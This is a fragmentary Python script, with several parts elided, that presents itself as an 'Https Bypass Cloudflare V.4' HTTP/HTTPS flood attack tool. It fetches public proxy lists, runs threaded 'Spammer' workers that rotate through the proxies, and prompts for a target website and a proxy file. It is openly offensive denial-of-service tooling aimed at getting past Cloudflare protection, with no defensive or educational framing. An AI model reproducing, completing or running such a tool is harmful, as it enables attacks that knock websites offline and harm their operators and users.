...
import requests
import time
## Script Https Bypass Cloudflare V.4 ##
# =================================== #
proxy = "proxy.txt"
rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=all&timeout=10000')
...
class Spammer(threading.Thread):
    ...
    def request(self):
        ...
        sys.stdout.write("Proxy : %s"%(self.lista[N]))
    def run(self):
        global N
        self.Lock.acquire()
...
class MainLoop():
    def __init__(self):
            os.system('cls')
            os.system('title Https Bypass CF V.4 ! #KRITTKORN')
            os.system('color a')
            print ("===============================")
            print ("  Http / Https Bypass Attack")
            print ("      FB : KRITT KORN")
            print ("            V.4")
            print ("===============================")
    ...
    def setup(self):
        ...
        while True:        
            ...
            try:
                ...
                print ('Please enter the website correctly !')
        while True:            
            try:
                l = str(input('File Proxy : '))
                in_file = open(l,"r")
                lista = []
                for i in in_file:
